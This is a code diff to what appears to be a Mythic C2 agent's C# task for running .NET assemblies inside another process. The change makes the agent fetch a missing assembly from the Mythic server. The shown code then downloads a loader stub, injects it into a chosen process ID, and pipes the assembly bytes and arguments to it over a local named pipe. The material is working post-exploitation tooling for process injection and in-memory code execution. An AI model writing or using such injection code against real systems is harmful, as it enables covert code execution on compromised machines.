@@ -30,6 +30,8 @@ namespace Tasks
             public string PipeName;
             [DataMember(Name = "assembly_name")]
             public string AssemblyName;
+            [DataMember(Name = "assembly_id")]
+            public string AssemblyId;
             [DataMember(Name = "assembly_arguments")]
             public string AssemblyArguments;
             [DataMember(Name = "loader_stub_id")]
@@ -130,68 +132,74 @@ namespace Tasks
 
                     if (pidRunning)
                     {
-                        if (_agent.GetFileManager().GetFileFromStore(parameters.AssemblyName, out byte[] assemblyBytes))
+                        byte[] assemblyBytes;
+                        if(!_agent.GetFileManager().GetFileFromStore(parameters.AssemblyName, out assemblyBytes))
                         {
-                            if (_agent.GetFileManager().GetFile(_cancellationToken.Token, _data.ID, parameters.LoaderStubId,
-                                    out byte[] exeAsmPic))
+                            if(!_agent.GetFileManager().GetFile(_cancellationToken.Token, _data.ID, parameters.AssemblyId, out assemblyBytes))
                             {
-                                var injector = _agent.GetInjectionManager().CreateInstance(exeAsmPic, parameters.PID);
-                                if (injector.Inject())
+                                resp = CreateTaskResponse($"Failed to fetch {parameters.AssemblyName} from Mythic", true);
+                                _agent.GetTaskManager().AddTaskResponseToQueue(resp);
+                                return;
+                            } else
+                            {
+                                _agent.GetFileManager().AddFileToStore(parameters.AssemblyName, assemblyBytes);
+                            }
+                        }
+                        if (_agent.GetFileManager().GetFile(_cancellationToken.Token, _data.ID, parameters.LoaderStubId,
+                                out byte[] exeAsmPic))
+                        {
+                            var injector = _agent.GetInjectionManager().CreateInstance(exeAsmPic, parameters.PID);
+                            if (injector.Inject())
+                            {
+                                _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse(
+                                    "",
+                                    false,
+                                    "",
+                                    new IMythicMessage[]
+                                    {
+                                        Artifact.ProcessInject(parameters.PID,
+                                            _agent.GetInjectionManager().GetCurrentTechnique().Name)
+                                    }));
+                                IPCCommandArguments cmdargs = new IPCCommandArguments
                                 {
-                                    _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse(
-                                        "",
-                                        false,
-                                        "",
-                                        new IMythicMessage[]
-                                        {
-                                            Artifact.ProcessInject(parameters.PID,
-                                                _agent.GetInjectionManager().GetCurrentTechnique().Name)
-                                        }));
-                                    IPCCommandArguments cmdargs = new IPCCommandArguments
+                                    ByteData = assemblyBytes,
+                                    StringData = string.IsNullOrEmpty(parameters.AssemblyArguments)
+                                        ? ""
+                                        : parameters.AssemblyArguments,
+                                };
+                                AsyncNamedPipeClient client = new AsyncNamedPipeClient("127.0.0.1", parameters.PipeName);
+                                client.ConnectionEstablished += Client_ConnectionEstablished;
+                                client.MessageReceived += Client_MessageReceived;
+                                client.Disconnect += Client_Disconnect;
+                                if (client.Connect(10000))
+                                {
+                                    IPCChunkedData[] chunks = _serializer.SerializeIPCMessage(cmdargs);
+                                    foreach (IPCChunkedData chunk in chunks)
                                     {
-                                        ByteData = assemblyBytes,
-                                        StringData = string.IsNullOrEmpty(parameters.AssemblyArguments)
-                                            ? ""
-                                            : parameters.AssemblyArguments,
-                                    };
-                                    AsyncNamedPipeClient client = new AsyncNamedPipeClient("127.0.0.1", parameters.PipeName);
-                                    client.ConnectionEstablished += Client_ConnectionEstablished;
-                                    client.MessageReceived += Client_MessageReceived;
-                                    client.Disconnect += Client_Disconnect;
-                                    if (client.Connect(10000))
-                                    {
-                                        IPCChunkedData[] chunks = _serializer.SerializeIPCMessage(cmdargs);
-                                        foreach (IPCChunkedData chunk in chunks)
-                                        {
-                                            _senderQueue.Enqueue(Encoding.UTF8.GetBytes(_serializer.Serialize(chunk)));
-                                        }
+                                        _senderQueue.Enqueue(Encoding.UTF8.GetBytes(_serializer.Serialize(chunk)));
+                                    }
 
-                                        _senderEvent.Set();
-                                        _complete.WaitOne();
-                                        _completed = true;
-                                        resp = CreateTaskResponse("", true, "completed");
-                                    }
-                                    else
-                                    {
-                                        resp = CreateTaskResponse($"Failed to connect to named pipe.", true, "error");
-                                    }
+                                    _senderEvent.Set();
+                                    _complete.WaitOne();
+                                    _completed = true;
+                                    resp = CreateTaskResponse("", true, "completed");
                                 }
                                 else
                                 {
-                                    resp = CreateTaskResponse($"Failed to inject into PID {parameters.PID}", true, "error");
+                                    resp = CreateTaskResponse($"Failed to connect to named pipe.", true, "error");
                                 }
                             }
                             else
                             {
-                                resp = CreateTaskResponse(
-                                    $"Failed to download assembly loader stub (with id: {parameters.LoaderStubId})",
-                                    true,
-                                    "error");
+                                resp = CreateTaskResponse($"Failed to inject into PID {parameters.PID}", true, "error");
                             }
                         }
                         else
                         {
-                            resp = CreateTaskResponse($"{parameters.AssemblyName} is not loaded (have you registered it?)", true);
+                            resp = CreateTaskResponse(
+                                $"Failed to download assembly loader stub (with id: {parameters.LoaderStubId})",
+                                true,
+                                "error");
                         }
                     }
                     else
